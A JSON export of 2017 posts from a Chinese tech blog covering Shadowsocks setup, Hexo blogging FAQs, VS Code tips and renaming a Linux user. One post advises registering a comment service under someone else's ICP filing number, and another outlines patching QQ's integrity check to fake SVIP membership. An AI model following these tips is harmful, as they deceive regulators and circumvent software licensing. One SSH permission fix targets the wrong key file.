=substring(guid,locate(&#x27;.com/&#x27;,guid)+5,locate(&#x27;.html&#x27;,guid)-locate(&#x27;.com/&#x27;,guid)-5)","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Shadowsocks常见问题整理","slug":"shadowsocks-faq","date":"2017-11-08T08:23:10.000Z","updated":"2017-11-08T08:23:10.000Z","comments":true,"path":"shadowsocks-faq.html","permalink":"https://sobaigu.com/shadowsocks-faq.html","excerpt":"","text":"前言 Shadowsocks【中文名影梭，简称SS】，目前最好的高性能Socks5安全代理工具，没有之一！ 搞个VPS自行搭建服务器端程序，配置好IP和密码等信息并启用服务后即可网络加速，红杏出墙一把即可畅游网络，想找什么学术文档都方便，再也不用担心被屏蔽，再也不担心买的账号突然用不了，私有代理用着爽歪歪。在使用过程中，新手难免遇到一些困惑，整理一二，仅供参考。 不得不说 Shadowsocks技术是好的，保证了我们的数据安全畅通，也让我们在当前现实环境下拥有了接触更多讯息的机会，这是好事。 但是，外面的世界很繁杂，轮子遗毒遍地，尤其是帝国主义亡我之心从来不死，所谓自由世界处处都存在着双标和白种人至上…… 落后就要挨打的真理永远有用，请时刻保持自己头脑清醒，不要让人轻易就洗脑，时刻让自己有分清是非黑白的能力。 不管身在何处，都别忘记自己是谁，从哪里来。 毕竟，我们都深深地爱着自己的祖国。 为啥要选Shadowsocks 一般人会说要个VPN，VPN顾名思义是虚拟专网，你接入VPN就是接入了一个专有网络，好比你在家，你家路由器后面的网络设备是在同一个网络，而VPN则是让你的设备进入了另一个网络，同时你的IP地址也变成了由VPN分配的一个IP地址，通常是一个私网地址。 也许，你只是要个代理能够访问外网而已，openVPN、PPTP、L2TP、Shadowsocks等都是技术方案之一。Shadowsocks是更注重流量混淆隐秘，VPN则是更注重加密安全性。 VPN目前就科学上网方面来讲，PPTP大部分地区已死，L2TP大部分地区已经出现干扰和断开连接情况，Openvpn一封一个准。而Shadowsocks是目前公认的最好的高性能Socks5安全代理工具，没有之一！而且Shadowsocks客户端更丰富，各种平台都有相应版本，使用更简单快捷直观。 代理账号怎么获取 免费的还真有，但基本不靠谱，自己弄个墙外的vps装个梯子服务端，想怎么用怎么用。 Shadowsocks首次怎么用 各平台客户端下载及使用参考 Shadowsocks服务端搭在Linux服务器上，那是不是客户机也要装Linux系统？ 不用，你客户机系统跟服务端装在什么系统里没半毛钱关系，你只需要根据自己使用设备选择对应平台版本的Shadowsocks客户端即可。 下载客户端后，请阅读下压缩包里的使用说明/readme.txt，回答些已经写得明明白白的问题很累的！ Windows版软件介绍及下载地址 Linux版软件使用说明 MacOS版软件使用说明 Android版软件介绍及下载地址 Android版ShadowsocksR客户端介绍及下载地址 IOS版软件使用说明 相信还是使用Windows系统的人居多，以Windows下客户端为例，其他平台大同小异： 下载系统对应的版本，将程序包解压到某个目录并启动Shadowsocks.exe，如果报错请打开包里的readme.txt或者按下文[.NET Framework 初始化错误解决办法](#启动的时候提示：.NET Framework 初始化错误)安装相应的依赖。 配置代理服务器，见：怎么配置代理 其他基本设置，如下图 怎么配置代理 可以通过配置也可以通过软件界面，能看这教程的还是直接通过软件界面来吧。 Shadowsocks客户端启动后，在右下角托盘区找到小飞机图标，在上面双击即可弹出服务器编辑界面，在里面按字段填入服务器，端口，密码，加密方式等信息，服务商没给你的保持默认即可，然后点确定保存，如下图： 注意：代理端口和加密方式一般默认即可 PAC模式和全局模式有什么区别 全局模式不需要多解释，顾名思义就是全部使用代理，所有的访问连接都需要经过代理服务器。 所谓PAC指的是代理自动配置，英文全文为Proxy auto-config，即按需代理，只有在PAC列表中的域名才会经过代理连接。 所以，全局模式多半是临时使用，大部分时候用的是PAC模式，访问油土鳖或者非死不可的时候自动走代理，访问干净无毒善良的百度就直接连了，更快速也没必要消耗代理服务器流量。 如果自己访问的网站不在PAC列表中，那则可以自己添加PAC规则即可，可参考：shadowsocks-添加PAC自定义规则。 启动的时候提示：.NET Framework 初始化错误 大概就是下面这样的提示： 12345Shadowsocks.exe - .NET Framework 初始化错误---------------------------若要运行此应用程序，您必须首先安装 .NET Framework 的以下版本之一: v4.0.30319有关如何获取 .NET Framework 的适当版本的说明，请与应用程序发行者联系。 原因是Shadowsocks.exe这个程序需要.net 4.0版本以上依赖支持，安装最新的.net再启动即可，最新.net点此微软官网下载。 下载安装完成后再启动即可。 系统代理模式该怎么选 如前文PAC模式和全局模式有什么区别 中所述，要看自己的实际需求，一般使用PAC模式。 怎么知道自己是否已经代理成功 如果访问连接经过了代理且正在消耗流量，那么右下角托盘区的小飞机上会有数据上传或下载的箭头实时显示，也可以在小飞机上右键&gt;帮助&gt;显示日志，在日志窗口可以看到实时代理速度和流量消耗。 再者，我们可以借助ip探测网站来查看自己是不是正被代理，如启用全局模式或者将其添加到PAC后用浏览器访问http://ip138.com ，此时可见自己的ip显示，如果是代理服务器的ip说明就是经过了代理了。 怎么改Shadowsocks的密码和端口 不是你自己的服务器或者自己不会的就不用看这条了。 Linux服务器上Shadowsocks的配置一般在/etc/shadowsocks/config.json里，如果有这个文件直接找到这个文件用vim编辑修改即可，里面的内容一目了然无需过多解释。也有些VPS里的Shadowsocks一般是用一键安装脚本安装的，此时就可能有差异，比如正在用的一个VPS，就没有/etc/shadowsocks/config.json这个文件，密码和端口是通过以下文件导入的： 12/root/.kiwivm-shadowsocks-port #修改端口在这里/root/.kiwivm-shadowsocks-password #修改密码在这里 修改完成后，通过service ssserver restart命令重启Shadowsocks服务端就把密码和端口改好了，此时客户端再同步修改保存即可。 浏览器打开网页提示500 Internal Privoxy Error 500 Internal Privoxy Error Privoxy encountered an error while processing your request: Could not load template file no-server-data or one of its included components. Please contact your proxy administrator. If you are the proxy administrator, please put the required file(s)in the (confdir)/templates directory. The location of the (confdir) directory is specified in the main Privoxy config file. (It’s typically the Privoxy install directory). 这个错误多半是代理不可用，请检查代理服务器是否正确配置，注意加密方式要和服务端一致。还有就是如果有360或者腾讯电脑管家这种，请将360卸载或者加入到360白名单中，弹出的提示选择允许所有并不再提示。 Shadowsocks日志错误：System.Net.Sockets.SocketException：请求的名称有效，但是找不到请求的类型数据 这个错误是有程序对系统代理进行了干扰，和上面的错误类似，有一些所谓安全软件请卸载或者将Shadowsocks相关程序加白。还有一类所谓路由卫士，请卸载掉重启系统后再使用即可，请他一些未知原因请逐个排查甚至重装干净系统使用，同一个Shadowsocks服务端，只要有任何地方任何一个能正常使用就说明VPS里安装的梯子服务是没问题的。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"Iphone或Ipad上Shadowsocks设置方法","slug":"how-to-use-shadowsocks-ios","date":"2017-11-07T06:30:21.000Z","updated":"2017-11-08T06:30:21.000Z","comments":true,"path":"how-to-use-shadowsocks-ios.html","permalink":"https://sobaigu.com/how-to-use-shadowsocks-ios.html","excerpt":"","text":"iOS上可用的代理 APP推荐Shadowrocket(2.99美元，23港元)、potasto(¥30)、SsrConnectPro(免费)和wingy(免费)。 有人做了个精简版的叫：FirstWingy，只支持 SS 不支持 SSR(R) ，如果是自己的服务器那就搭SS服务端使用SS支持的协议，客户端是免费的可以去用下。 技术发展到今天，有些软件逐渐跟不上节奏被淘汰了，iOS上还是直接选Shadowrocket吧，花点钱省事。 本文以wingy为例介绍。其它APP使用方法是类似的，Shadowrocket-小火箭的使用图文教程点此查看。 wingy下载 Wingy是一个IOS的Shadowsocks客户端，并且完全免费，您可以直接在苹果App Store直接搜索进行安装。目前有 2 个版本主要是针对不用的 iOS 版本，请根据 APP 兼容性 描述下载正确的版本： 系统版本 开发者 对应 APP 下载链接 iOS 9.3+ wang xiao jun 蓝色图标 APP iOS 10.0+ SMART LIMITED 紫色图标 APP 添加代理服务器 安装好后打开 APP 点击 右上角 加号 [+]： 添加代理配置，代理类型选择Shadowsocks，按照 shadowsocks 帐号信息填写配置： 如果有服务器的二维码图片，也可以选扫描二维码。 保存后回到主界面，选择线路（刚刚添加的Hostus），如果第一次连接可能会要求设置Touch ID，直接录入指纹即可，不出意外就会看到连接成功的截图。 测试连接 用手机浏览器访问非死不可或者油土鳖这种世界上不存在的网站，能打开就说明成功啦。 常见问题 下载时提示：项目不可用 您要的产品目前在中国商店不提供 这是因为解放区敏感原因，请切换到其他国家和地区搜索下载安装即可： 进入app store，在页面最下方，右下角有个小国旗地方点进去可以切换别的国家的商店，其他方法自行寻求搜索引擎帮助 来个知乎上的教程，仅供参考。 其它客户端简介 Shadowrocket shadowrocket是目前比较火的一个IOS平台Shadowsocks协议软件，俗称小火箭。配置简单，和shadowsocks一样，可以选择手动配置和扫描二维码配置。 支持Shadowsocks原版、ShadowsocksR协议和混淆，是目前支持ShadowsocksR最好的IOS客户端之一，并且往往跟进SSR各项功能最快。 APP Store售价 23港元。 Potatso Potatso自带adblock规则，可以用来屏蔽各大视频网站的广告，俗称土豆丝。 支持Shadowsocks原版、ShadowsocksR协议和混淆。 APP Store售价 45元(持续涨价)。 Potatso2 是上面那个的升级版，功能更好，是目前支持ShadowsocksR最好的IOS客户端之一。 netkit netkit支持Shadowsocks原版、ShadowsocksR协议和混淆。 APP Store售价 12元。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"无备案网站使用畅言评论方法","slug":"hexo-with-changyan-comments","date":"2017-11-02T09:18:00.000Z","updated":"2017-11-02T09:18:00.000Z","comments":true,"path":"hexo-with-changyan-comments.html","permalink":"https://sobaigu.com/hexo-with-changyan-comments.html","excerpt":"","text":"前言 Hexo的硬伤是没数据库，不带评论系统，虽然没什么人评论，但总归是有一个才觉得舒服。早前用的Disqus，见：博客评论从多说迁移到Disqus-再见，多说。 但奈何Disqus速度不尽如人意，最终还是走了偏门，用上了需要备案号才能用的畅言评论系统。 今天又有人问起Hexo评论怎么办，整理下以前自己做的，写了这个教程，以供参考。 畅言评论开启与设置 第一步：注册畅言 注册没什么好说的，到畅言官网注册个账号，该认证的认证，该绑定的绑定。 第二步：找个可用的备案号 随便去哪找，找个别人的备案号，且没有在畅言系统里登记过的。 打开畅言后台，左边菜单：账号设置&gt;管理站点&gt;添加站点,站点名称随你填，但站点网址和ICP备案号需要填你刚找的，这里需要网址和备案号相对应。 域名白名单里填刚才的站点网址，提交审核，一般需要1~2个工作日才会给你审核通过。 第三步：添加域名白名单 上一步审核通过后，我们接下来需要将自己的网站添加到域名白名单中，以便我们自己的网站可以使用畅言评论系统。 登录畅言后台，切到通过审核的站点，在左侧菜单：系统设置&gt;通用设置，在域名白名单中加入自己网站的地址，然后点保存设置即可。由于前面已经审核通过了，这次保存设置将自动通过审核，几分钟后就可以在自己的网站使用畅言评论了。 主题中启用畅言评论 Hexo中要使用第三方评论系统，需要对应的主题支持，所以这步需要去查阅主题说明文档，一般是在主题的_config.yml中进行设置，如院长用的主题为maupassant，那么在主题目录下的_config.yml有这么一段： 1234# 上面是其他第三方评论设置，下面这两行是畅言的changyan: ## Your changyan appid, e.g. cyrALsXc8changyan_conf: ## Your changyan appkey, e.g. prod_d8a508c2825ab57eeb43e7c69bba0e8b 畅言秘钥APPID和APPKEY到畅言后台总览中去取，填配置的时候注意:后要空一格。 常见问题 提示：畅言代码无效，请检查文章链接... 多半是在调试，前面我们已经知道了畅言是要绑定域名的，如果通过localhost这种访问，那肯定是与域名白名单不符合的，这个时候就提示不匹配不让用。 当然，如果你刚加的网址白名单，或者白名单审核未完成自然也是不能用的，不能用的时候去畅言后台看下网址白名单里的网址是否和你访问的一致。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"百度网盘高速下载工具","slug":"software-baidu-pan-downloader","date":"2017-10-28T08:44:19.000Z","updated":"2017-10-28T08:44:19.000Z","comments":true,"path":"software-baidu-pan-downloader.html","permalink":"https://sobaigu.com/software-baidu-pan-downloader.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文 文件大小：3.2 m 支持系统：Windows 官方主页：pandownload.com 软件介绍 百度网盘高速下载器-PanDownload，小巧免费的工具由52pojie原创会员Kiryuu制作。 这款超级快的百度网盘下载工具，使任何百度等级账号都能真正不限速高速下载，大家公认的目前最强大、最好用、最有效的第三方百度网盘下载客户端，实属良心之作！ 高速下载原理 PanDownload采用了Aria2技术，支持离线下载、新番下载、提取下载链接、自定义Aria2配置、自定义分享密码，原理类似油猴脚本+IDM，软件获取直链后调用Aria2进行下载，登陆网盘账号获取自己的网盘资源下载。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 网盘下载 官网下载 BitTorrent Sync 提取码","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"vscode-跨平台，绿色免费，基本接近完美的编辑器","slug":"software-vscode","date":"2017-10-23T12:49:48.000Z","updated":"2017-10-23T12:49:48.000Z","comments":true,"path":"software-vscode.html","permalink":"https://sobaigu.com/software-vscode.html","excerpt":"","text":"前言 之前用过很多编辑器，主要用来写MarkDown文档，偶尔也编辑些代码，最后Atom和typora这两款用的比较多，推荐过几款比较优秀的：MarkDown编辑器推荐。 使用下来发现Atom太笨重，启动速度也慢，欣慰的是插件功能强大，能进行文件夹管理，与Git集成功能好用。typora编辑MarkDown文档所见即所得，尤其是便捷的编辑表格很让人喜欢，但不支持文件夹管理，不支持Git集成管理，略有遗憾。 接近完美的编辑器 还好，vscode几乎能比较完美地兼顾以上两款浏览器的遗憾。虽然之前版本也用过，但没认真去调教过，这次最新版本下载下来眼前一亮： 界面颜值还可以 支持文件夹管理 支持Git集成 启动速度不错 扩展也很多 快捷键与Atom基本相同，用的顺手 集成终端调试 支持文件内查找替换 以上功能让vscode接近完美编辑器，虽然略有小瑕疵，如编辑带中文内容的批处理时会有编码问题，没有MarkDown表格编辑的功能，不知道有没有这样的扩展支持。以上这些特性，对于我来说，已经很好了，以后的主力编辑器就是vscode了，Atom再见，虽然你也很优秀。 常见问题 资源管理器里的文件排序 因为有个文件夹下文件比较多，用的年月打头文件名，但默认排序是年份小的在前，新建了个文件要拉到文件夹底部才看到，有点麻烦。 这问题扩展里各种关键词搜了一圈，都只有代码排序的，并没有涉及资源文件显示排序。 Google也翻了个遍，居然没有人问起这个问题，也没有答案，倒是找到了个visual studio的扩展是用来排序的，可惜vscode上不能用。 最后在设置自动换行的时候，居然发现vscode自带排序设置： 1&quot;explorer.sortOrder&quot;: &quot;default&quot;, 控制资源管理器文件和文件夹的排列顺序。除了默认排列顺序，你也可以设置为 “mixed” (文件和文件夹一起排序)、“type” (按文件类型排)、“modified” (按最后修改日期排)或是 “filesFirst” (将文件排在文件夹前)。 在这个设置项左边点下编辑图标，选择自己要的排序，比如modified，保存重启编辑器即可将最新的文件排在最前面了。 让编辑器自动换行 按alt+z能实现换行，但只是当次在编辑的文件里换行，换个文件或重启又不换行了。 要保存自动换行效果需要到设置中去改配置，找到： 1&quot;editor.wordWrap&quot;: &quot;off&quot;, 控制折行方式。可以选择： - “off” （禁用折行）， - “on” （视区折行）， - “wordWrapColumn”（在“editor.wordWrapColumn”处折行）或 - “bounded”（在视区与“editor.wordWrapColumn”两者的较小者处折行）。 一样的，点击该行左边的编辑图标，将其改为on即可。 更改tab宽度 默认tab制表符是4个空格，个人觉得太宽了，所以改成了2个字符，属于个人洁癖。找到： 1&quot;editor.tabSize&quot;: 4, 点左侧的编辑图标，将4改成2即可。 Git提交日志问题 原先用GitHubdesktop提交Git，界面划分了概要和描述，提交后再看日志很好看。 而vscode里Git提交只有一行输入框，都输入在里面看上去挺别扭的，规范的方法： 在提交的时候可第一行写概要，然后空一行，下面再分行写提交描述就达到和GitHub桌面客户端一样的效果了。 12345&lt;Header&gt;# 此处是空行&lt;Body&gt;# 此处是空行&lt;Footer&gt; Header是必填项，也就是第一行给个提交概况说明，格式如：&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;，示例如： 123fix: 修改了读取不到配置的问题配置文件结尾判断错误，导致读取失败 提交规范见阮一峰:Commit message 和 Change log 编写指南","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"GoodHexo使用常见问题及解决办法","slug":"goodhexo-faq","date":"2017-10-20T06:49:35.000Z","updated":"2017-10-20T06:49:35.000Z","comments":true,"path":"goodhexo-faq.html","permalink":"https://sobaigu.com/goodhexo-faq.html","excerpt":"","text":"前言 接触Hexo已经有不短的时间，期间自己也踩过很多坑，将自己及小白们遇到的问题整理一二，以供参考。 经常会被问到一些问题，也算是对高频问题的一次整理吧。 GoodHexo设置相关 GoodHexo都可以设置些什么 GoodHexo的配置都在Hexo目录下的_config.yml中。用文本编辑器打开该文件后，可看到很多相关设置字段，按照字段说明进行修改或者填充对应的值即可。 怎么修改主题 修改主题的工作可大可小，暂且理解为更换主题，这个操作在Hexo的_config.yml中修改theme:后面的值为你要换的主题名保存即可。 再者，对主题的个性化定制修改就要求有技术功底了，一般主题的说明文档中都会提到怎么设置，但进一步修改就要自己去琢磨主题代码了，有能力的自行设计。 关于菜单怎么来 和标签等菜单类似，在source目录新建个about目录，然后在里面创建个index.md页面文件『以上这些步骤其实只需要用一条命令就完成了：hexo new page about』，填上正确的front-matter头，然后其他的就跟写普通文章一样了。 123456---title: 关于本站layout: pagecomments: true # false表示不允许评论---这里开始写关于介绍... GoodHexo部署相关 文章发布不成功 hexo g正常生成了HTML静态页文件，本地测试也正常，但外网访问不对，没有更新。 如果是hexo d命令之后就结束了，没有任何后续反应，很可能是Hexo的配置不完整，导致发布不成功，检查Hexo目录下的_config.yml中部署仓库相关配置是不是不存在了。 部署仓库配置正常情况下应该是这样子的： 12345deploy: type: git repo: https://github.com/xxx/xxx.github.io.git branch: master message: Hexo update 如果配置没错，发布也提示 git done ，那请稍安勿躁，服务器上还没有更新，稍后再试即可。 为什么用自定义域名无法访问 GitHub，coding等都提供了绑定自定义域名的功能，在Hexo\\source目录下建个无后缀文本CNAME,在里面填上自己的域名就可以了，不需要带协议。 做完以上只是在网站文件托管商那做了绑定，还需要你到域名dns解析商那【比如阿里云或者dnspod等】，将你的域名做个cname解析到GitHub等提供给你的二级域名上。 部署到GitHub时提示Fatal:the remote and hung up等错误 这个可能是网络问题，稍后再试，或者架个梯子再试。 如果已经有梯子，看下是不是使用的PAC规则而GitHub.com不在PAC文件里，切换到全局模式或者添加GitHub.com规则，相关规则可参考：shadowsocks-添加PAC自定义规则，其他梯子软件大同小异，请自行研究。 Hexo博客能不能部署到自己的VPS上 能，如果自己的VPS稳定可靠的话还建议部署到自己的VPS，自己的机器一般都比GitHub，codingpage等提供的空间大，对域名绑定操作也更灵活。如果你的域名有备案或者打算备案，建议买腾讯云或者阿里云的云服务器。 而且GitHub绑定自定义域名后不支持https，coding则需要在网站底部放置host by coding，否则要先跳广告页才到你的博客。 部署到自己的VPS我曾经写过完整教程，可见：Hexo博客Git-VPS部署完整记录 SSH方式发布失败 Permissions 0644 ‘xxx/.ssh/id_rsa’ are too open SSH认证是很方便的，设置好后免去设置密码的烦恼，但有时候会发布不成功，日志会如上面的提示。 这是因为Linux系统安全机制造成的，一般是上传的SSH密钥权限太开放了，所以只需要将秘钥文件设置合适的权限即可： 1# chmod 400 ~/.ssh/id_rsa.pub 网站内容相关 怎么找好看的博客主题 萝卜白菜各有所爱，自己喜欢的主题才是好看的。可以到Hexo主题官网去翻，哪个顺眼就挑哪个。 注意事项： 在官网主题页找主题时，点击略缩图是跳转到演示网站，点击下面的主题标题则跳转到对应的主题代码托管仓库，找到主题文档安装文档说明就可以换上你认为好看的主题了。 博客打开空白或显示404 Hexo只是个渲染服务，并不会智能检测内容上的错误。所以在渲染前你需要新建至少一篇文章，并按Hexo的格式要求填充相关内容，再经过Hexo才能解析出正常有内容的HTML页面。 如果发布提示 git done ，那请稍安勿躁，服务器上还没有更新，稍后再试即可。 要删除一篇文章怎么搞 Hexo站点所有的源文件都在Hexo\\source目录下，其中_posts目录下放的是文章的MarkDown源文件，然后渲染发布。 如果无变化或者一些莫名其妙的残留，将里面不要的文件删除后 hexo clean清理一遍再渲染发布就可以了。 怎么修改博客头像 头像一般是主题的功能，不同的主题有不同的设置及修改方法，一般在主题目录下的_config.yml里设置。请找到主题说明文档，然后按照主题说明一步步操作。 改配置，页面模板等文件，最好不要用Windows系统自带的那个记事本，记事本推荐用：Notepad2-mod_Windows自带记事本的绝佳替代 标签菜单点进去提示404错误 和上面的首页打开404类似，默认是没有的，需要自己创建入口页。在source目录新建个tags目录，然后在里面创建个index.md文件，该文件只需要front-matter头就可以了，其他的都不需要。 12345678---title:type: &#x27;tags&#x27;layout: &#x27;tags&#x27;comments: truedate: 2017-02-24 17:37:05updated: 2017-02-24 17:37:05--- 其他菜单以此类推就可以，目录与Hexo配置文件_config.yml中对应，类型参考Hexo官方文档。 123456# Directorysource_dir: source #网站跟目录public_dir: c:\\Hexopublic #渲染发布文件夹tag_dir: tags #标签目录archive_dir: archives #存档目录category_dir: categories #分类目录 GoodHexo怎么添加评论系统 Hexo本来就是将MarkDown解析成HTML，纯静态无数据库，所以是不带评论登录等功能的。 如果需要，可以使用畅言，disqus等第三方评论系统，参考教程： 博客评论从多说迁移到Disqus 无备案网站使用畅言评论方法 怎么实现首页只显示文章摘要 这个需要主题模板支持，大部分的主题都是支持摘要显示的，支持的方法也大同小异，具体请参考主题文档。 通用方法 通用方法是在文章内容中添加&lt;!--more--&gt;注释，渲染的时候会自动将该注释前内容当做文章摘要处理。 front-matter定义摘要 上面通用方法不适用于想把中间某段当做摘要概况的情况，此时你就可以在 front-matter 中定义一段文章摘要取代 &lt;!--more--&gt; 注释的方法，详见：Hexo中MarkDown文档头规范。 文章中要怎么使用图片 这属于MarkDown的基础知识，基本语法可以参考这里。 图片路径引用包括两种方法： 图床引用 自己存储 自己存储 在GoodHexo的目录结构 中，source是网站的根目录，所以如果要把图片放在自己的网站存储空间内，那么你可以在source目录下建个目录如images，然后把图片放在这个目录，文章中插入：![](../images/xx.png)即表示该图片位置在你的域名/images/xx.png。 图床引用 所谓图床就是一个专门用来存图片的地方，然后在任意地方引用图片的访问地址，如把图片传到微博，然后得到微博上该图片的地址，在需要插入图片的地方使用绝对路径引用即可： ![](https://wx1.sinaimg.cn/mw690/xx.jpg) 别人给你存储图片往往表示不可控，所以久了就会出现图片不在了，原先这图片是承载的啥内容也不知道，本院的原则是能不用图片就尽量不用图片。 hexo d 时刷 zone.offset 提示大概是这样子的： 1zone.offset has been deprecated in favor of zone.utcOffset 请检查系统时区设置和hexo配置文件 _config.yml 中网站时区配置是否一致。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"},{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"自己制作绿色便携去广告版QQ","slug":"how-to-build-portable-qq","date":"2017-10-12T10:33:26.000Z","updated":"2017-10-12T10:33:26.000Z","comments":true,"path":"how-to-build-portable-qq.html","permalink":"https://sobaigu.com/how-to-build-portable-qq.html","excerpt":"谈到腾讯QQ的广告，对于用QQ的朋友来说，可以去除广告的选择很多，相比而言很多方法很简单的，比如有广告拦截软件、开通QQ会员、HOSTS屏蔽、占位文件阻止、辅助工具屏蔽等方法，而直接改模块破解方法少，无非就是去安全校验后删广告组件，这里非外挂和辅助工具挟持方式破解，直接爆力硬改原始模块增改代码方式，实现完美去广告破解本地SVIP超级会员！","text":"谈到腾讯QQ的广告，对于用QQ的朋友来说，可以去除广告的选择很多，相比而言很多方法很简单的，比如有广告拦截软件、开通QQ会员、HOSTS屏蔽、占位文件阻止、辅助工具屏蔽等方法，而直接改模块破解方法少，无非就是去安全校验后删广告组件，这里非外挂和辅助工具挟持方式破解，直接爆力硬改原始模块增改代码方式，实现完美去广告破解本地SVIP超级会员！ SVIP超级会员补丁有啥作用？ 非外挂增改模块破解为本地VIP超级会员，点亮SVIP尊贵标识图标； （注：自7.7以后尊贵标识图标只能显示为VIP，其它相关特权能照用) 自动勾选系统设置的不显广告项，非会员即可完美实现过滤掉广告； 可以免费使用VIP会员头像、免费使用会员多终端设备表情漫游特权； 免费使用VIP签名表情、免费使用表情涂鸦高级、VIP炫彩字体功能； 腾讯QQVIP本地会员补丁下载地址 链接失效，自行Google 如何制作QQ绿色版及使用这个补丁？ 下载QQ官方版，用右键7z打开压缩包提取file文件夹 下载TXSSO库，用右键7z打开压缩包提取txsso文件夹 把txsso文件夹放到file\\bin文件夹（这是本地TXSSO库） 下载QQ去整体安全校验补丁，放到”file\\bin”文件夹下运行！ 下载QQSVIP超级会员补丁放到”file\\bin”文件夹下运行完成！ 这样，一个自己制作的QQ绿色去广告版就制作好了，good luck。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Linux系统中修改用户名","slug":"how-to-change-username-in-linux","date":"2017-09-19T06:30:21.000Z","updated":"2017-09-19T06:30:21.000Z","comments":true,"path":"how-to-change-username-in-linux.html","permalink":"https://sobaigu.com/how-to-change-username-in-linux.html","excerpt":"","text":"前言 由于工作及兴趣爱好的原因，平时使用操作系统Linux和Windows使用频率各占一半。 在安装系统或者创建用户时，经常会随意敲击几个字符，后面用着总觉着不好，尤其是在Linux使用过程中，shell界面看到前面的字符老是不爽，所以会需要将已经存在的用户名进行更改的情况。 需要修改的文件 Linux下修改用户名需要改动以下几个地方： /etc/passwd /etc/group /etc/gshadow /etc/shadow 更改用户目录 /etc/sudoers //非必须 操作步骤 修改以上文件都涉及添加可写权限，所以为了减少频繁sudo，建议直接切换到root用户下进行操作。 以用户名aaa 为例，最终将其更改为sobaigu 修改passwd 1234[root@zaza ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologin //表示该用户无登录系统权限aaa:x:503:503::/home/aaa/:/bin/bash passwd 默认是无写入权限的，所以第一步需要添加写入权限，往后的步骤也同理，不再赘述。 12[root@zaza ~]# chmod +w /etc/passwd[root@zaza ~]# vim /etc/passwd 将其内容变更为sobaigu:x:503:503::/home/sobaigu/:/bin/bash ，然后保存退出。 改完后记得还原权限，chmod -w /etc/passwd将写入权限取消，以免造成安全隐患，其他操作也同理。 修改/etc/group 1234[root@zaza ~]# cat /etc/grouproot:x:0:bin:x:1:bin,daemonaaa:x:503: 将aaa修改为想要的名字sobaigu 1234[root@zaza ~]# cat /etc/grouproot:x:0:bin:x:1:bin,daemonsobaigu:x:503: 修改/etc/gshadow 12[root@zaza ~]# cat /etc/gshadowaaa:!:: 只需要修改名称对应的部分，其他部分不用动。 修改/etc/shadow 123[root@zaza ~]# chmod +w /etc/shadow[root@zaza ~]# vim /etc/shadow[root@zaza ~]# chmod -w /etc/shadow 这个文件涉及密码信息，就不贴内容了，同样的原则，将用户名改改，其他的就别动了了。如果想改用户密码，改完后用passwd命令修改就行了。 修改用户家目录 之前建用户的时候会一并建里家目录，如果这里不改，那使用的目录还是老的，也可以用，索性一并改了。 1[root@zaza ~]# mv /home/aaa /home/sobaigu 修改/etc/sudoers 做这个主要是给自己用的账号赋予sudo 权限，要不然要权限的时候只能切到其他账户去。 xxx is not in the sudoers file. This incident will be reported 12[root@zaza 